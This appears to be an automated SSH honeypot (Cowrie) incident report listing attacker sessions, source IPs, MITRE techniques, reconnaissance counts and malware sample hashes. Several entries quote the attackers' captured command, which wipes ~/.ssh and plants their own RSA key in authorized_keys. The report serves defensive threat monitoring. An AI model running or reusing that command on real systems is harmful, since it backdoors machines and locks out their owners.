|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 13:11 |
| **Last Seen** | 2026-04-30 13:11 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 13:11:43` | `cowrie.session.connect` |
| `2026-04-30 13:11:43` | `cowrie.client.version` |
| `2026-04-30 13:11:43` | `cowrie.client.kex` |
| `2026-04-30 13:11:44` | `cowrie.login.success` |
| `2026-04-30 13:11:44` | `cowrie.session.params` |
| `2026-04-30 13:11:44` | `cowrie.command.input` |
| `2026-04-30 13:11:44` | `cowrie.command.failed` |
| `2026-04-30 13:11:44` | `cowrie.log.closed` |
| `2026-04-30 13:11:45` | `cowrie.session.params` |
| `2026-04-30 13:11:45` | `cowrie.command.input` |
| `2026-04-30 13:11:45` | `cowrie.session.file_download` |
| `2026-04-30 13:11:45` | `cowrie.log.closed` |
| `2026-04-30 13:11:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0ad4ecf4159

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 13:11 |
| **Last Seen** | 2026-04-30 13:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 13:11:47` | `cowrie.session.connect` |
| `2026-04-30 13:11:47` | `cowrie.client.version` |
| `2026-04-30 13:11:48` | `cowrie.client.kex` |
| `2026-04-30 13:11:48` | `cowrie.login.success` |
| `2026-04-30 13:11:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acc02b186f70

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 13:15 |
| **Last Seen** | 2026-04-30 13:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 13:15:02` | `cowrie.session.connect` |
| `2026-04-30 13:15:02` | `cowrie.client.version` |
| `2026-04-30 13:15:02` | `cowrie.client.kex` |
| `2026-04-30 13:15:03` | `cowrie.login.success` |
| `2026-04-30 13:15:03` | `cowrie.session.params` |
| `2026-04-30 13:15:03` | `cowrie.command.input` |
| `2026-04-30 13:15:03` | `cowrie.command.failed` |
| `2026-04-30 13:15:03` | `cowrie.log.closed` |
| `2026-04-30 13:15:04` | `cowrie.session.params` |
| `2026-04-30 13:15:04` | `cowrie.command.input` |
| `2026-04-30 13:15:04` | `cowrie.session.file_download` |
| `2026-04-30 13:15:04` | `cowrie.log.closed` |
| `2026-04-30 13:15:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4634be171311

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 13:15 |
| **Last Seen** | 2026-04-30 13:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 13:15:06` | `cowrie.session.connect` |
| `2026-04-30 13:15:06` | `cowrie.client.version` |
| `2026-04-30 13:15:07` | `cowrie.client.kex` |
| `2026-04-30 13:15:07` | `cowrie.login.success` |
| `2026-04-30 13:15:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d4d73f99bda

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 13:15 |
| **Last Seen** | 2026-04-30 13:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 13:15:56` | `cowrie.session.connect` |
| `2026-04-30 13:15:56` | `cowrie.client.version` |
| `2026-04-30 13:15:56` | `cowrie.client.kex` |
| `2026-04-30 13:15:57` | `cowrie.login.success` |
| `2026-04-30 13:15:57` | `cowrie.session.params` |
| `2026-04-30 13:15:57` | `cowrie.command.input` |
| `2026-04-30 13:15:57` | `cowrie.command.failed` |
| `2026-04-30 13:15:57` | `cowrie.log.closed` |
| `2026-04-30 13:15:58` | `cowrie.session.params` |
| `2026-04-30 13:15:58` | `cowrie.command.input` |
| `2026-04-30 13:15:58` | `cowrie.session.file_download` |
| `2026-04-30 13:15:58` | `cowrie.log.closed` |
| `2026-04-30 13:16:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf78f79f2b47

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 13:16 |
| **Last Seen** | 2026-04-30 13:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 13:16:01` | `cowrie.session.connect` |
| `2026-04-30 13:16:01` | `cowrie.client.version` |
| `2026-04-30 13:16:01` | `cowrie.client.kex` |
| `2026-04-30 13:16:02` | `cowrie.login.success` |
| `2026-04-30 13:16:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b70cfa93fee

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 13:16 |
| **Last Seen** | 2026-04-30 13:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 13:16:49` | `cowrie.session.connect` |
| `2026-04-30 13:16:49` | `cowrie.client.version` |
| `2026-04-30 13:16:49` | `cowrie.client.kex` |
| `2026-04-30 13:16:50` | `cowrie.login.success` |
| `2026-04-30 13:16:51` | `cowrie.session.params` |
| `2026-04-30 13:16:51` | `cowrie.command.input` |
| `2026-04-30 13:16:51` | `cowrie.command.failed` |
| `2026-04-30 13:16:51` | `cowrie.log.closed` |
| `2026-04-30 13:16:51` | `cowrie.session.params` |
| `2026-04-30 13:16:51` | `cowrie.command.input` |
| `2026-04-30 13:16:51` | `cowrie.session.file_download` |
| `2026-04-30 13:16:51` | `cowrie.log.closed` |
| `2026-04-30 13:16:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4458b1e2bb7

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 13:16 |
| **Last Seen** | 2026-04-30 13:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 13:16:54` | `cowrie.session.connect` |
| `2026-04-30 13:16:54` | `cowrie.client.version` |
| `2026-04-30 13:16:54` | `cowrie.client.kex` |
| `2026-04-30 13:16:55` | `cowrie.login.success` |
| `2026-04-30 13:16:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42c6bab2398b

| Field | Detail |
|---|---|
| **Source IP** | `31.59.89[.]180` |
| **First Seen** | 2026-04-30 13:17 |
| **Last Seen** | 2026-04-30 13:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 13:17:11` | `cowrie.session.connect` |
| `2026-04-30 13:17:11` | `cowrie.client.version` |
| `2026-04-30 13:17:11` | `cowrie.client.kex` |
| `2026-04-30 13:17:12` | `cowrie.login.success` |
| `2026-04-30 13:17:12` | `cowrie.session.params` |
| `2026-04-30 13:17:12` | `cowrie.command.input` |
| `2026-04-30 13:17:12` | `cowrie.command.failed` |
| `2026-04-30 13:17:12` | `cowrie.log.closed` |
| `2026-04-30 13:17:12` | `cowrie.session.params` |
| `2026-04-30 13:17:12` | `cowrie.command.input` |
| `2026-04-30 13:17:13` | `cowrie.session.file_download` |
| `2026-04-30 13:17:13` | `cowrie.log.closed` |
| `2026-04-30 13:17:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.59.89[.]180` to AbuseIPDB if not already reported
- [ ] Block `31.59.89[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cee106f59549

| Field | Detail |
|---|---|
| **Source IP** | `31.59.89[.]180` |
| **First Seen** | 2026-04-30 13:17 |
| **Last Seen** | 2026-04-30 13:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 13:17:15` | `cowrie.session.connect` |
| `2026-04-30 13:17:15` | `cowrie.client.version` |
| `2026-04-30 13:17:15` | `cowrie.client.kex` |
| `2026-04-30 13:17:15` | `cowrie.login.success` |
| `2026-04-30 13:17:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.59.89[.]180` to AbuseIPDB if not already reported
- [ ] Block `31.59.89[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a03f7e6e12a

| Field | Detail |
|---|---|
| **Source IP** | `31.59.89[.]180` |
| **First Seen** | 2026-04-30 13:28 |
| **Last Seen** | 2026-04-30 13:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 13:28:04` | `cowrie.session.connect` |
| `2026-04-30 13:28:04` | `cowrie.client.version` |
| `2026-04-30 13:28:04` | `cowrie.client.kex` |
| `2026-04-30 13:28:05` | `cowrie.login.success` |
| `2026-04-30 13:28:05` | `cowrie.session.params` |
| `2026-04-30 13:28:05` | `cowrie.command.input` |
| `2026-04-30 13:28:05` | `cowrie.command.failed` |
| `2026-04-30 13:28:05` | `cowrie.log.closed` |
| `2026-04-30 13:28:06` | `cowrie.session.params` |
| `2026-04-30 13:28:06` | `cowrie.command.input` |
| `2026-04-30 13:28:06` | `cowrie.session.file_download` |
| `2026-04-30 13:28:06` | `cowrie.log.closed` |
| `2026-04-30 13:28:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.59.89[.]180` to AbuseIPDB if not already reported
- [ ] Block `31.59.89[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8eb54289be23

| Field | Detail |
|---|---|
| **Source IP** | `31.59.89[.]180` |
| **First Seen** | 2026-04-30 13:28 |
| **Last Seen** | 2026-04-30 13:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 13:28:08` | `cowrie.session.connect` |
| `2026-04-30 13:28:08` | `cowrie.client.version` |
| `2026-04-30 13:28:08` | `cowrie.client.kex` |
| `2026-04-30 13:28:09` | `cowrie.login.success` |
| `2026-04-30 13:28:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.59.89[.]180` to AbuseIPDB if not already reported
- [ ] Block `31.59.89[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `138.124.20[.]112` | **30** | 2026-04-30 12:10 | 2026-04-30 13:16 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `31.59.89[.]180` | **30** | 2026-04-30 13:04 | 2026-04-30 13:33 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.67.78[.]49` | **29** | 2026-04-30 11:01 | 2026-04-30 11:39 | 1m | 28 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `49.207.40[.]162` | **7** | 2026-04-30 10:11 | 2026-04-30 10:53 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `59.17.95[.]129` | **6** | 2026-04-30 10:33 | 2026-04-30 10:44 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `103.165.139[.]145` | **4** | 2026-04-30 10:38 | 2026-04-30 10:42 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `185.92.182[.]129` | **4** | 2026-04-30 10:11 | 2026-04-30 10:14 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `16.58.56[.]214` | **2** | 2026-04-30 11:24 | 2026-04-30 11:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.163.30[.]209` | **2** | 2026-04-30 12:20 | 2026-04-30 12:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `85.11.167[.]220` | **2** | 2026-04-30 10:14 | 2026-04-30 10:17 | 3m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `86.177.76[.]168` | **2** | 2026-04-30 10:59 | 2026-04-30 11:01 | 4m | 0 | `T1592` | 🟢 LOW |
| `102.88.137[.]213` | 1 | 2026-04-30 11:55 | 2026-04-30 11:55 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `104.251.180[.]238` | 1 | 2026-04-30 11:07 | 2026-04-30 11:08 | 30s | 0 | `T1592` | 🟢 LOW |
| `117.242.152[.]161` | 1 | 2026-04-30 12:00 | 2026-04-30 12:01 | 13s | 0 | `T1592` | 🟢 LOW |
| `120.48.42[.]17` | 1 | 2026-04-30 10:31 | 2026-04-30 10:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `151.40.205[.]12` | 1 | 2026-04-30 13:55 | 2026-04-30 13:55 | 14s | 0 | `T1592` | 🟢 LOW |
| `171.15.54[.]43` | 1 | 2026-04-30 10:30 | 2026-04-30 10:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `18.206.156[.]151` | 1 | 2026-04-30 12:55 | 2026-04-30 12:55 | 1s | 0 | `T1592` | 🟢 LOW |
| `35.216.140[.]3` | 1 | 2026-04-30 13:01 | 2026-04-30 13:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `41.216.177[.]55` | 1 | 2026-04-30 10:50 | 2026-04-30 10:50 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-04-30 13:39 | 2026-04-30 13:40 | 40s | 0 | `T1592` | 🟢 LOW |
| `5.42.113[.]29` | 1 | 2026-04-30 11:25 | 2026-04-30 11:25 | 30s | 0 | `T1592` | 🟢 LOW |
| `58.209.82[.]184` | 1 | 2026-04-30 10:32 | 2026-04-30 10:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `64.227.109[.]89` | 1 | 2026-04-30 12:49 | 2026-04-30 12:49 | 2s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (25 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 40/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
